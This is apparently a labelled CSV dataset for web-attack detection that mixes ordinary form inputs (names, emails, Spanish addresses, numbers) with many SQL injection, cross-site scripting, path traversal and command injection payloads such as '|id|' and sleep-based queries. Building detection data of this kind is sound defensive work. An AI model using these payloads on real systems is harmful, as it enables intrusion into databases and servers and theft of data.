payload,length,attack_type,label
"1%""))) union all select null,null,null,null,null,null#",54,sqli,anom
1'+(select gkve where 1943=1943 waitfor delay '0:0:5')+',56,sqli,anom
smelters,8,norm,norm
"1' where 6853=6853 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",122,sqli,anom
1') or sleep(5)#,16,sqli,anom
"-7388"") as rlth where 5746=5746 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",228,sqli,anom
37891,5,norm,norm
946,3,norm,norm
rosebud,7,norm,norm
kouraviev@socimi.com.gl,23,norm,norm
filis,5,norm,norm
0446161008040688,16,norm,norm
"1'+(select biqo where 6046=6046;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",92,sqli,anom
15429251t,9,norm,norm
"1,(select (case when (2970=5830) then 1 else 2970*(select 2970 from mysql.db) end))",83,sqli,anom
8225299412218383,16,norm,norm
marion_daumery1@salacomplices.sd,32,norm,norm
"1'))) and make_set(6094=2929,2929) and ((('gkyo'='gkyo",54,sqli,anom
bolado pellicer,15,norm,norm
<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('crosssitescripting')></object>,129,xss,anom
1'+(select plhk where 6540=6540;select (case when (8403=7151) then 8403 else cast(1 as int)/(select 0 from dual) end) from dual--,129,sqli,anom
"1 and elt(4249=4249,7259)-- meef",32,sqli,anom
racette,7,norm,norm
1') and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),190,sqli,anom
1)) as rbcf where 1053=1053;select (case when (3325=1767) then 3325 else 3325*(select 3325 from mysql.db) end)#,111,sqli,anom
"1 where 1776=1776 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",158,sqli,anom
378,3,norm,norm
peluffo1@psicoencuentronline.va,31,norm,norm
1'||(select 'pxkz' where 2207=2207 and (3020=3020)*6703)||',59,sqli,anom
"1'||(select 'ttyt' where 3751=3751 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",136,sqli,anom
chapurrar,9,norm,norm
71196230y,9,norm,norm
estades orizales,16,norm,norm
46881104c,9,norm,norm
39500,5,norm,norm
akashi1@g-audio.td,18,norm,norm
"1')) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('uadr' like 'uadr",179,sqli,anom
"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""rzja"" like ""rzja",84,sqli,anom
flore,5,norm,norm
"1%')) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",158,sqli,anom
machiavello bordones,20,norm,norm
"c/ el cedro s/n, 2-c",20,norm,norm
calle siete cerros 144,22,norm,norm
9e1an906,8,norm,norm
2365,4,norm,norm
"frutos 65, 10?a",15,norm,norm
dabbas hurtado,14,norm,norm
chiaoyun,8,norm,norm
0582956368100582,16,norm,norm
(select (case when (8130=5894) then 8130 else 8130*(select 8130 from information_schema.character_sets) end)),109,sqli,anom
c/ enrique mensaque 95,22,norm,norm
"-6160'))) or make_set(1924=4415,4415) and ((('hayr'='hayr",57,sqli,anom
<style><!--</style><script>alert('xss');//--></script>,54,xss,anom
"1""))) union all select null,null,null,null,null,null,null,null,null,null#",73,sqli,anom
4277353398050908,16,norm,norm
laguna del marquesado,21,norm,norm
jub0lo2o,8,norm,norm
1')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('hcpo' like 'hcpo,209,sqli,anom
85907610b,9,norm,norm
filogamo@copiar.com.nu,22,norm,norm
-4557%')) or 4537=3401 and (('%'=',34,sqli,anom
"camino hoya mondongo, 124",25,norm,norm
kellard@todobetis.gf,20,norm,norm
83657455s,9,norm,norm
"-1<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>",150,xss,anom
"1%"")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""%""=""",187,sqli,anom
-3378')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('otbq'='otbq,225,sqli,anom
oviedo,6,norm,norm
/..///..///..///..///..///{file},32,path-traversal,anom
swenson@pasajesaereosbaratos.do,31,norm,norm
"-9142%""))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""%""=""",218,sqli,anom
inglis@baltasarsantos.vu,24,norm,norm
"olivar, 174,",12,norm,norm
1 where 8532=8532;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,82,sqli,anom
fraser,6,norm,norm
3023,4,norm,norm
68733218h,9,norm,norm
"1')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('nets' like 'nets",227,sqli,anom
"campa zabala 184,",17,norm,norm
-3185')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('rknd' like 'rknd,218,sqli,anom
catatipia,9,norm,norm
"1'))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",146,sqli,anom
puntagorda,10,norm,norm
"1%"") and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",196,sqli,anom
34347,5,norm,norm
5975278199435199,16,norm,norm
delito,6,norm,norm
03248i367ca,11,norm,norm
brassell,8,norm,norm
"1"")) or (select * from (select(sleep(5)))ydpu) and ((""imlq"" like ""imlq",70,sqli,anom
calle rosa de los vientos 166 9?a,33,norm,norm
-5313'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('wkkp' like 'wkkp,220,sqli,anom
"-7499%"") union all select 1893,1893,1893,1893,1893#",51,sqli,anom
"-4745"" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ""nifq"" like ""nifq",121,sqli,anom
gorrero,7,norm,norm
"1') where 6988=6988 union all select null,null,null,null,null,null,null,null--",78,sqli,anom
17255,5,norm,norm
"1""));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",101,sqli,anom
"1"")) and elt(3785=9386,9386) and ((""inwa"" like ""inwa",52,sqli,anom
vyjayant,8,norm,norm
8clo736,7,norm,norm
abrams.peabody@hojadecalculo.com.py,35,norm,norm
"1"") union all select null,null,null,null,null,null,null,null,null,null#",71,sqli,anom
llambric acebron,16,norm,norm
7a13,4,norm,norm
valdealgorfa,12,norm,norm
1%'))) union all select null--,30,sqli,anom
"1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ygfv'='ygfv",117,sqli,anom
"-5738"") as efbn where 8541=8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#",89,sqli,anom
75p80ica,8,norm,norm
naca39,6,norm,norm
1'||(select 'vxfx' where 7038=7038 and 9306=4187)||',52,sqli,anom
"-5027%"")) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((""%""=""",114,sqli,anom
imaz.leftwich@culturalsanpedrocf.no,35,norm,norm
chaplin,7,norm,norm
45210940r,9,norm,norm
mercado 188,11,norm,norm
e517a$d7,8,norm,norm
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('bvdw'='bvdw",211,sqli,anom
"1)));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",65,sqli,anom
"1') where 6388=6388 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",121,sqli,anom
-8233' or 9538=1882#,20,sqli,anom
9ara,4,norm,norm
melbourn,8,norm,norm
linden,6,norm,norm
"1"";select sleep(5)#",19,sqli,anom
"1"") and (3020=3020)*6703 and (""hkjf""=""hkjf",42,sqli,anom
1 where 6036=6036 and 7533=7533--,33,sqli,anom
arquitectnico,13,norm,norm
cuevas de san marcos,20,norm,norm
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('qdsr' like 'qdsr",165,sqli,anom
persson_mcclanahan@deseoun.km,29,norm,norm
chilel,6,norm,norm
"1"")) waitfor delay '0:0:5' and ((""witb""=""witb",45,sqli,anom
"c/ tren de arganda 189,",23,norm,norm
8230522127552712,16,norm,norm
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../../../../../../{file},291,path-traversal,anom
22587,5,norm,norm
fitness,7,norm,norm
bijman3,7,norm,norm
d50allecido,11,norm,norm
60578448j,9,norm,norm
1424,4,norm,norm
bollullos de la mitacin,23,norm,norm
brbara,6,norm,norm
1'))) and sleep(5)#,19,sqli,anom
4654406617611743,16,norm,norm
1' in boolean mode);select pg_sleep(5)--,40,sqli,anom
098oro4a4,9,norm,norm
"""`false`""",9,cmdi,anom
1386580487506748,16,norm,norm
7309058964317313,16,norm,norm
1));(select * from (select(sleep(5)))srmq) and ((4982=4982,58,sqli,anom
1)) union all select null#,26,sqli,anom
72622550g,9,norm,norm
"1'+(select 'qrml' where 3791=3791 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",96,sqli,anom
"1 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))# qmkh",68,sqli,anom
boulay,6,norm,norm
6790,4,norm,norm
"-2718"" or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""xwbf""=""xwbf",203,sqli,anom
olalla,6,norm,norm
303,3,norm,norm
"calle salvatierra 196,",22,norm,norm
"1"")));select sleep(5)#",22,sqli,anom
crous zuta,10,norm,norm
music jaume isern 189,21,norm,norm
demias,6,norm,norm
"fernandez latorre 14,",21,norm,norm
30827206f,9,norm,norm
negri-hand@automoviles-hibridos.mo,34,norm,norm
-8513) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (5818=5818,219,sqli,anom
antnimo,7,norm,norm
lenya@fbi-criminal-network.com.mil,34,norm,norm
incom1a5abl8mente,17,norm,norm
"1"") as oztl where 6655=6655 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",129,sqli,anom
"1' where 7036=7036;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",119,sqli,anom
"c/ cardenal cisneros 70, 12?d",29,norm,norm
/usr/bin/id|,12,cmdi,anom
;|/usr/bin/id|,14,cmdi,anom
tomono@esteticadayda.az,23,norm,norm
villaverde de scar,18,norm,norm
barro,5,norm,norm
"c/ berruguete 23,",17,norm,norm
-8465' where 5242=5242 or 3806=7423--,37,sqli,anom
1056,4,norm,norm
aghi,4,norm,norm
mellor,6,norm,norm
"1%') and elt(4670=9403,9403) and ('%'='",39,sqli,anom
19312,5,norm,norm
puntallana,10,norm,norm
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",103,sqli,anom
1')));select sleep(5) and ((('qjsc'='qjsc,41,sqli,anom
papero,6,norm,norm
matula,6,norm,norm
panter,6,norm,norm
"1"")) as knyf where 8109=8109 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",90,sqli,anom
48748000y,9,norm,norm
1) as crsd where 5271=5271 waitfor delay '0:0:5'--,50,sqli,anom
b+rigola,8,norm,norm
santiago apostol 82 13?h,24,norm,norm
travesia de fernando sasiain 35 2?c,35,norm,norm
aventajada,10,norm,norm
alidia,6,norm,norm
8513796211360261,16,norm,norm
"calle roger de lauria, 4",24,norm,norm
"-5026' where 7324=7324 union all select 7324,7324--",51,sqli,anom
bartoli ferrada,15,norm,norm
"1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",107,sqli,anom
"-8364') union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",70,sqli,anom
cottencon@palomajimenez.mr,26,norm,norm
penningt,8,norm,norm
barrenechea sadurn,18,norm,norm
7398,4,norm,norm
1%'));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,114,sqli,anom
02660,5,norm,norm
2008736994858842,16,norm,norm
"1"" where 2394=2394 and 8831=8333--",34,sqli,anom
1') and 4595=4595#,18,sqli,anom
nabau fuentes,13,norm,norm
huffman@tobarisch.tt,20,norm,norm
mosen agustin jerico 183 2h,27,norm,norm
robina,6,norm,norm
"1 where 2292=2292 union all select null,null,null,null#",55,sqli,anom
5937893714425522,16,norm,norm
49830,5,norm,norm
lilley@intelethernet.ic,23,norm,norm
08586,5,norm,norm
churriana de la vega,20,norm,norm
"campo de mirra/camp de mirra, el",32,norm,norm
"1%"") and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""%""=""",214,sqli,anom
gottschlich_candy@piaceredelivery.pk,36,norm,norm
1'+(select qydm where 6019=6019;select (case when (2394=4530) then 2394 else 2394*(select 2394 from information_schema.character_sets) end)#,140,sqli,anom
94987112x,9,norm,norm
lafferty,8,norm,norm
argujillo,9,norm,norm
"-2583"") where 3455=3455 or make_set(9354=9354,7185)--",53,sqli,anom
karattup,8,norm,norm
"1%')) or elt(6272=6272,sleep(5)) and (('%'='",44,sqli,anom
46819300v,9,norm,norm
"1"") where 3058=3058 union all select null--",43,sqli,anom
"-1<img lowsrc=""javascript:document.cookie=true;"">",49,xss,anom
"1')) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (('mwyu'='mwyu",113,sqli,anom
esteban,7,norm,norm
32430,5,norm,norm
33418,5,norm,norm
1) as jtfx where 8038=8038;select sleep(5)--,44,sqli,anom
"1"") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""rvub"" like ""rvub",132,sqli,anom
pernign,7,norm,norm
fintzi-tevis@cbgerindote.sv,27,norm,norm
36563093q,9,norm,norm
zarratn,7,norm,norm
7ar82fa,7,norm,norm
">""<img src=""blah""onmouseover=""document.cookie=true;"">",53,xss,anom
h?ele77,7,norm,norm
"1'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('rnyb'='rnyb",209,sqli,anom
"(select 2*(if((select * from (select concat(0x7171706a71,(select (elt(6130=6130,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",151,sqli,anom
08930,5,norm,norm
caminomorisco,13,norm,norm
calle guatemala 12 11c,22,norm,norm
"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",64,sqli,anom
"c/ el jacinto, 132,",19,norm,norm
"carretera barajas, 147,",23,norm,norm
hattar4,7,norm,norm
"dir+c:"",7,cmdi,anom ||+dir|c:""",30,cmdi,anom
"-8026 or elt(8434=4516,4516)# bsqo",34,sqli,anom
kaunas,6,norm,norm
2561,4,norm,norm
torres de la alameda,20,norm,norm
1' in boolean mode) and 4457=3885#,34,sqli,anom
mallott@edifico.bf,18,norm,norm
"1%"")) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",81,sqli,anom
albuquerque periquet,20,norm,norm
petunia,7,norm,norm
"1))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((1205=1205",111,sqli,anom
1875,4,norm,norm
"(select 1 from generate_series(8515,8515,case when (8515=3477) then 1 else 0 end) limit 1)",90,sqli,anom
08zaril0o,9,norm,norm
bjorn,5,norm,norm
"-9209%""))) union all select 3736,3736,3736--",44,sqli,anom
"1'||(select 'gikt' where 8447=8447 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",132,sqli,anom
-8486%'))) or 8571=8571--,25,sqli,anom
"-6587') union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",76,sqli,anom
"1' in boolean mode) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)#",150,sqli,anom
5628,4,norm,norm
56346174s,9,norm,norm
-6095') or 6872=6872 and ('bfwm' like 'bfwm,43,sqli,anom
09311,5,norm,norm
"1%"")));begin dbms_lock.sleep(5); end and (((""%""=""",49,sqli,anom
"1"" where 1132=1132 or 6793=(select 6793 from pg_sleep(5))--",59,sqli,anom
vasil9,6,norm,norm
c406l2n5,8,norm,norm
zidanelia,9,norm,norm
"""data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==""></embed>",69,xss,anom
santa mara de las hoyas,23,norm,norm
"-8893%') union all select 1254,1254--",37,sqli,anom
estamariu,9,norm,norm
/..///..///..///..///..///..///..///..///{file},47,path-traversal,anom
"<a href=""about:<script>document.cookie=true;</script>"">",55,xss,anom
ahern.plott@zonamodelos.fr,26,norm,norm
""";alert(1)//",12,xss,anom
20709,5,norm,norm
9629,4,norm,norm
30503437d,9,norm,norm
balsam-prey@mmo.com.cat,23,norm,norm
8474675220591045,16,norm,norm
|id|,4,cmdi,anom
41724359j,9,norm,norm
"1'||(select 'ylek' where 3803=3803 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))||'",234,sqli,anom
g16i7a0a,8,norm,norm
"-9096"") where 9452=9452 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",256,sqli,anom
36830,5,norm,norm
aposesionar,11,norm,norm
6341227779092516,16,norm,norm
1';(select * from (select(sleep(5)))srmq) and 'yfvu' like 'yfvu,63,sqli,anom
"calle mercurio, 19,",19,norm,norm
herrera,7,norm,norm
"1');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",86,sqli,anom
holding@onoratoinformatica.in,29,norm,norm
"jana, la",8,norm,norm
jaazael,7,norm,norm
micr6pil8,9,norm,norm
22997112x,9,norm,norm
cedric,6,norm,norm
82311327p,9,norm,norm
d9str7par,9,norm,norm
barbads,7,norm,norm
bel bautista,12,norm,norm
"1""))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""dksc""=""dksc",206,sqli,anom
